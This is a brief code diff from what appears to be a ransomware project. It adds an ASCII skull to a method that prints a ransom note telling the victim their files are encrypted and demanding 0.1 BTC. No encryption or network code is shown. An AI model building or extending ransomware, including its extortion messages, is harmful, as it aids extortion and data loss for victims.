@@ -44,6 +44,7 @@ class Ransomware:
     def ransom_user(self):
         """ Inform user about encryption of his files. """
         print(
+            "  _____\n/     \n| () () |\n \\  ^  /\n  |||||\n  |||||"
             "Hi, all your files has been encrypted. Please "
             "send 0.1 BTC on this address to get decryption"
         )
